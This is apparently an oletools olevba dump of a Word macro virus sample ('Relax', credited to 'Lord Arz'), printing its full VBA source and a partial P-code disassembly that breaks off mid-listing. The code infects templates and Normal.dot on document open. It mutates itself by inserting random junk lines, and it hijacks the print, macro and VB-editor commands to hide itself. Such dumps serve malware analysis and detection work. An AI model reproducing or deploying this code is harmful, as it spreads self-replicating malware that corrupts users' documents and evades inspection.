olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Npol.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Npol.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Relax.AutoOpen
End Sub
-------------------------------------------------------------------------------
VBA MACRO Relax.bas 
in file: Virus.MSWord.Intended.Npol.c - OLE stream: 'Macros/VBA/Relax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem #########################
Rem #  Technical Illusions  #
Rem #   Virus by Lord Arz   #
Rem #########################
Sub AutoOpen()
On Error Resume Next
Randomize (Timer)
SpreadDir = Application.Path & "\"
Victim = Dir(SpreadDir & "\*.dot")

Do Until Victim = ""
    SetAttr SpreadDir & Victim, vbNormal
    Application.OrganizerCopy ThisDocument.FullName, SpreadDir & Victim, "Relax", wdOrganizerObjectProjectItems
    Victim = Dir
Loop

Application.OrganizerCopy ThisDocument.FullName, SpreadDir & "\*.doc", "Relax", wdOrganizerObjectProjectItems
SpreadDir = Environ("WINDIR") & "\Recent"
Chk = Dir(recent & "\*.doc")
If Chk = True Then Application.OrganizerCopy ThisDocument.FullName, SpreadDir & "\*.doc", "Relax", wdOrganizerObjectProjectItems
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Relax" Then GoTo AlreadyDone
Next i

Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Relax", wdOrganizerObjectProjectItems
Application.OrganizerCopy ActiveDocument.FullName, Environ("WinDir") & "\ShellNew\Winword8.doc", "Relax", wdOrganizerObjectProjectItems

VirusJump = "Private Sub Document_Open()"
VirusJump = VirusJump & "Relax.AutoOpen" & Chr(13) & "End Sub"

With ActiveDocument.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, VirusJump
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, VirusJump
End With
AlreadyDone:
If Int(Rnd * 24) > Hour(Time) Then
    MorphFactor = Int(Rnd * 10)
    Select Case MorphFactor
    Case 1
        Fake = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 999999999))
    Case 2
        Fake = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & Chr(58) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(58)
    Case 3
        Fake = "DoEvents"
    Case 4
        Fake = "'" & Application.UserName & Application.UserAddress & Application.ActivePrinter
    Case 5
        JumpPoint = Chr(Int(Rnd * 5) + 65) & Hex(CStr(Oct(MorphFactor ^ 4) & CStr(Day(Date)) & CStr(Minute(Time)) & CStr(Hour(Time))))
        Fake = "Goto " & JumpPoint & Chr(13) & JumpPoint & ":"
    Case 6
        Fake = Chr(13)
    Case 7
        Fake = "For " & Chr(MorphFactor + 65) & " = 1 To 1" & Chr(13) & "Next " & Chr(MorphFactor + 65)
    Case 8
        Fake = "Rem"
    Case 9
        Fake = "If " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45)) & "Then " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45))
    Case 10
        Fake = "Do" & Chr(13) & "Exit Do" & Chr(13) & "Loop"
    End Select
    ThisDocument.VBProject.VBComponents("Relax").CodeModule.InsertLines Int(Rnd * ThisDocument.VBProject.VBComponents("Relax").CodeModule.CountOfLines - 3) + 1, Fake
End If
End Sub
Sub FilePrint()
On Error Resume Next
'Note that the pic is from Progenic Warfare [P®W] © 1998
Sweety = "                         8888  8888888" & Chr(13)
Sweety = Sweety & "               8888:::8888888888888888888888888" & Chr(13)
Sweety = Sweety & "             8888::::::8888888888888888888888888888 " & Chr(13)
Sweety = Sweety & "            88::::::::888:::8888888888888888888888888" & Chr(13)
Sweety = Sweety & "          88888888::::8:::::::::::88888888888888888888" & Chr(13)
Sweety = Sweety & "        888 8::888888::::::::::::::::::88888888888   888" & Chr(13)
Sweety = Sweety & "           88::::88888888::::m::::::::::88888888888    8" & Chr(13)
Sweety = Sweety & "         888888888888888888:M:::::::::::8888888888888" & Chr(13)
Sweety = Sweety & "        88888888888888888888::::::::::::M88888888888888" & Chr(13)
Sweety = Sweety & "        8888888888888888888888:::::::::M8888888888888888" & Chr(13)
Sweety = Sweety & "         8888888888888888888888:::::::M888888888888888888" & Chr(13)
Sweety = Sweety & "        8888888888888888::88888::::::M88888888888888888888" & Chr(13)
Sweety = Sweety & "      88888888888888888:::88888:::::M888888888888888   8888" & Chr(13)
Sweety = Sweety & "     88888888888888888:::88888::::M::;o*M*o;888888888    88" & Chr(13)
Sweety = Sweety & "    88888888888888888:::8888:::::M:::::::::::88888888    8" & Chr(13)
Sweety = Sweety & "   88888888888888888::::88::::::M:;:::::::::::888888888" & Chr(13)
Sweety = Sweety & "  8888888888888888888:::8::::::M::aAa::::::::M8888888888       8" & Chr(13)
Sweety = Sweety & "  88   8888888888::88::::8::::M:::::::::::::888888888888888 8888" & Chr(13)
Sweety = Sweety & " 88  88888888888:::8:::::::::M::::::::::;::88:88888888888888888" & Chr(13)
Sweety = Sweety & " 8  8888888888888:::::::::::M::²@@@@@@@²::::8w8888888888888888" & Chr(13)
Sweety = Sweety & "  88888888888:888::::::::::M:::::³@a@³:::::M8i888888888888888" & Chr(13)
Sweety = Sweety & " 8888888888::::88:::::::::M88:::::::::::::M88z88888888888888888" & Chr(13)
Sweety = Sweety & "8888888888:::::8:::::::::M88888:::::::::MM888!888888888888888888" & Chr(13)
Sweety = Sweety & "888888888:::::8:::::::::M8888888MAmmmAMVMM888*88888888   88888888" & Chr(13)
Sweety = Sweety & "888888 M:::::::::::::::M888888888:::::::MM88888888888888   8888888" & Chr(13)
Sweety = Sweety & "8888   M::::::::::::::M88888888888::::::MM888888888888888    88888" & Chr(13)
Sweety = Sweety & " 888   M:::::::::::::M8888888888888M:::::mM888888888888888    8888" & Chr(13)
Sweety = Sweety & "  888  M::::::::::::M8888:888888888888::::m::Mm88888 888888   8888" & Chr(13)
Sweety = Sweety & "   88  M::::::::::::8888:88888888888888888::::::Mm8   88888   888" & Chr(13)
Sweety = Sweety & "   88  M::::::::::8888M::88888::888888888888:::::::Mm88888    88" & Chr(13)
Sweety = Sweety & "   8   MM::::::::8888M:::8888:::::888888888888::::::::Mm8     4" & Chr(13)
Sweety = Sweety & "       8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm    2" & Chr(13)
Sweety = Sweety & "      88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M" & Chr(13)
Sweety = Sweety & "     8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M" & Chr(13)
Sweety = Sweety & "    88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M" & Chr(13)
Sweety = Sweety & "   88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:" & Chr(13)
Sweety = Sweety & "   8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M" & Chr(13)
Sweety = Sweety & "     88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M" & Chr(13)
Sweety = Sweety & "    888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M" & Chr(13)
Sweety = Sweety & "    888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8" & Chr(13)
Sweety = Sweety & "    88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@" & Chr(13)
Sweety = Sweety & "    8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@" & Chr(13)
Sweety = Sweety & "     888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8" & Chr(13)
Sweety = Sweety & "     888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M" & Chr(13)
Sweety = Sweety & "      88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM" & Chr(13)
Sweety = Sweety & "       88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM" & Chr(13)
Sweety = Sweety & "        88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM" & Chr(13)
Sweety = Sweety & "         88   8MM::::::::::::::::::::::::::::::::::MMMMMM" & Chr(13)
Sweety = Sweety & "          8   88MM::::::::::::::::::::::M:::M::::::::MM" & Chr(13)
Sweety = Sweety & "              888MM::::::::::::::::::MM::::::MM::::::MM" & Chr(13)
Sweety = Sweety & "             88888MM:::::::::::::::MMM:::::::mM:::::MM" & Chr(13)
Sweety = Sweety & "             888888MM:::::::::::::MMM:::::::::MMM:::M" & Chr(13)
Sweety = Sweety & "            88888888MM:::::::::::MMM:::::::::::MM:::M" & Chr(13)
Sweety = Sweety & "           88 8888888M:::::::::MMM::::::::::::::M:::M" & Chr(13)
Sweety = Sweety & "           8  888888 M:::::::MM:::::::::::::::::M:::M:" & Chr(13)
Sweety = Sweety & "              888888 M::::::M:::::::::::::::::::M:::MM" & Chr(13)
Sweety = Sweety & "             888888  M:::::M::::::::::::::::::::::::M:M" & Chr(13)
Sweety = Sweety & "             888888  M:::::M:::::::::@::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "             88888   M::::::::::::::@@:::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "            88888   M::::::::::::::@@@::::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "           88888   M:::::::::::::::@@::::::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "          88888   M:::::m::::::::::@::::::::::Mm:::::::M:::M" & Chr(13)
Sweety = Sweety & "          8888   M:::::M:::::::::::::::::::::::MM:::::::M:::M" & Chr(13)
Sweety = Sweety & "         8888   M:::::M:::::::::::::::::::::::MMM::::::::M:::M" & Chr(13)
Sweety = Sweety & "        888    M:::::Mm::::::::::::::::::::::MMM:::::::::M::::M" & Chr(13)
Sweety = Sweety & "      8888    MM::::Mm:::::::::::::::::::::MMMM:::::::::m::m:::M" & Chr(13)
Sweety = Sweety & "     888      M:::::M::::::::::::::::::::MMM::::::::::::M::mm:::M" & Chr(13)
Sweety = Sweety & "  8888       MM:::::::::::::::::::::::::MM:::::::::::::mM::MM:::M:" & Chr(13)
Sweety = Sweety & "             M:::::::::::::::::::::::::M:::::::::::::::mM::MM:::Mm" & Chr(13)
Sweety = Sweety & "            MM::::::m:::::::::::::::::::::::::::::::::::M::MM:::MM" & Chr(13)
Sweety = Sweety & "            M::::::::M:::::::::::::::::::::::::::::::::::M::M:::MM" & Chr(13)
Sweety = Sweety & "           MM:::::::::M:::::::::::::M:::::::::::::::::::::M:M:::MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::M88:::::::::M:::::::::::::::::::::::MM::MMM" & Chr(13)
Sweety = Sweety & "           M::::::::::::8888888888M::::::::::::::::::::::::MM::MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::88888888M:::::::::::::::::::::::::M::MM" & Chr(13)
Sweety = Sweety & "           M::::::::::::::888888M:::::::::::::::::::::::::M::MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::::88888M:::::::::::::::::::::::::M:MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::::::88M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "           MM:::::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "            M:::::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "            MM:::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "             M:::::::::::::::M:::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "             MM:::::::::::::M:::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "              M:::::::::::::M::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "              MM:::::::::::M::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "               M:::::::::::M:::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "               MM:::::::::M:::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                M:::::::::M::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                MM:::::::M::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                 MM::::::M:::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                 MM:::::M:::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                  MM::::M::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                  MM:::M::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                   MM::M:::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                   MM:M:::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MMM::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MM::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                     M:::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MM::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MM:::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    mMM::::MM:::::::MMMM" & Chr(13)
Sweety = Sweety & "                     mMM:::M:::::::M:M:M" & Chr(13)
Sweety = Sweety & "                      MM::MMM::::::::M:M" & Chr(13)
Sweety = Sweety & "                       MM::MM:::::::::M:M" & Chr(13)
Sweety = Sweety & "                       MM::MM::::::::::M:m" & Chr(13)
Sweety = Sweety & "                       MM:::M:::::::::::MM" & Chr(13)
Sweety = Sweety & "                       MMM:::::::::::::::M:" & Chr(13)
Sweety = Sweety & "                       MMM:::::::::::::::M:" & Chr(13)
Sweety = Sweety & "                       MMM::::::::::::::::M" & Chr(13)
Sweety = Sweety & "                       MMM::::::::::::::::M" & Chr(13)
Sweety = Sweety & "                       MMM::::::::::::::::Mm" & Chr(13)
Sweety = Sweety & "                        MM::::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                         MM::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                         MMM:::::::::::::MM" & Chr(13)
Sweety = Sweety & "                         MMM:::::::::::::MM" & Chr(13)
Sweety = Sweety & "                         MMM::::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MM::::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MM::::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MM:::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MMM::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MMM::::::::::MM" & Chr(13)
Sweety = Sweety & "                           MM:::::::::MM" & Chr(13)
Sweety = Sweety & "                           MMM::::::::MM" & Chr(13)
Sweety = Sweety & "                            MMM::::::MM" & Chr(13)
Sweety = Sweety & "                             MM::::::MM" & Chr(13)
Sweety = Sweety & "                              MM:::::MM" & Chr(13)
Sweety = Sweety & "                              MM:::::M:M" & Chr(13)
Sweety = Sweety & "                              :M::::::M:" & Chr(13)
Sweety = Sweety & "                            M:::M::::::M" & Chr(13)
Sweety = Sweety & "                          M:::::M:::::::M" & Chr(13)
Sweety = Sweety & "                         M::::::MM:::::::M" & Chr(13)
Sweety = Sweety & "                         M:::::::M::::::::M" & Chr(13)
Sweety = Sweety & "                         M;:;::::M:::::::::M" & Chr(13)
Sweety = Sweety & "                         M:m:;:::M::::::::::M" & Chr(13)
Sweety = Sweety & "                         MM:m:m::M::::::::;:M" & Chr(13)
Sweety = Sweety & "                          MM:m::MM:::::::;:;M" & Chr(13)
Sweety = Sweety & "                           MM::MMM::::::;:m:M" & Chr(13)
Sweety = Sweety & "                            MMMM MM::::m:m:MM" & Chr(13)
Sweety = Sweety & "                                  MM::::m:MM" & Chr(13)
Sweety = Sweety & "                                   MM::::MM" & Chr(13)
Sweety = Sweety & "                                    MM::MM" & Chr(13)

Selection.Font.Size = 4
Selection.Font.Name = "Courier New"
Selection.MoveEnd
Selection.Text = Sweety
Dialogs(wdDialogFilePrint).Show
Selection.Delete
End Sub

Sub ViewVBCode()
On Error Resume Next
With ActiveDocument.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With

Application.OrganizerDelete ActiveDocument.Name, "Relax", wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate.Name, "Relax", wdOrganizerObjectProjectItems
ShowVisualBasicEditor = True
End Sub

Sub ToolsMacro()
On Error Resume Next
With ActiveDocument.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With

Application.OrganizerDelete ActiveDocument.Name, "Relax", wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate.Name, "Relax", wdOrganizerObjectProjectItems
Dialogs(wdDialogToolsMacro).Display
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Npol.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2386 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Ld Relax 
' 	ArgsMemCall AutoOpen 0x0000 
' Line #2:
' 	EndSub 
' Macros/VBA/Relax - 23669 bytes
' Line #0:
' 	Rem 0x001A " #########################"
' Line #1:
' 	Rem 0x001A " #  Technical Illusions  #"
' Line #2:
' 	Rem 0x001A " #   Virus by Lord Arz   #"
' Line #3:
' 	Rem 0x001A " #########################"
' Line #4:
' 	FuncDefn (Sub AutoOpen())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #7:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St SpreadDir 
' Line #8:
' 	Ld SpreadDir 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St Victim 
' Line #9:
' Line #10:
' 	Ld Victim 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoUnitil 
' Line #11:
' 	Ld SpreadDir 
' 	Ld Victim 
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #12:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld SpreadDir 
' 	Ld Victim 
' 	Concat 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #13:
' 	Ld Dir 
' 	St Victim 
' Line #14:
' 	Loop 
' Line #15:
' Line #16:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld SpreadDir 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #17:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0007 "\Recent"
' 	Concat 
' 	St SpreadDir 
' Line #18:
' 	Ld recent 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St Chk 
' Line #19:
' 	Ld Chk 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld SpreadDir 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Relax"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AlreadyDone 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #25:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0016 "\ShellNew\Winword8.doc"
' 	Concat 
' 	LitStr 0x0005 "Relax"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #26:
' Line #27:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St VirusJump 
' Line #28:
' 	Ld VirusJump 
' 	LitStr 0x000E "Relax.AutoOpen"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St VirusJump 
' Line #29:
' Line #30:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #31:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld VirusJump 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #33:
' 	EndWith 
' Line #34:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #35:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld VirusJump 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #37:
' 	EndWith 
' Line #38:
' 	Label AlreadyDone 
' Line #39:
' 	Ld Rnd 
' 	LitDI2 0x0018 
' 	Mul 
' 	FnInt 
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	Gt 
' 	IfBlock 
' Line #40:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St MorphFactor 
' Line #41:
' 	Ld MorphFactor 
' 	SelectCase 
' Line #42:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #43:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitDI4 0xC9FF 0x3B9A 
' 	Mul 
' 	FnInt 
' 	Coerce (Str) 
' 	Concat 
' 	St Fake 
' Line #44:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #45:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Fake 
' Line #46:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #47:
' 	LitStr 0x0008 "DoEvents"
' 	St Fake 
' Line #48:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #49:
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	St Fake 
' Line #50:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #51:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld MorphFactor 
' 	LitDI2 0x0004 
' 	Pwr 
' 	ArgsLd Oct 0x0001 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	Coerce (Str) 
' 	Concat 
' 	Ld Time 
' 	ArgsLd Minute 0x0001 
' 	Coerce (Str) 
' 	Concat 
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	Coerce (Str) 
' 	Concat 
' 	Coerce (Str) 
' 	ArgsLd Hex 0x0001 
' 	Concat 
' 	St JumpPoint 
' Line #52:
' 	LitStr 0x0005 "Goto "
' 	Ld JumpPoint 
' 	Concat 
' 	LitDI2 0x000D 
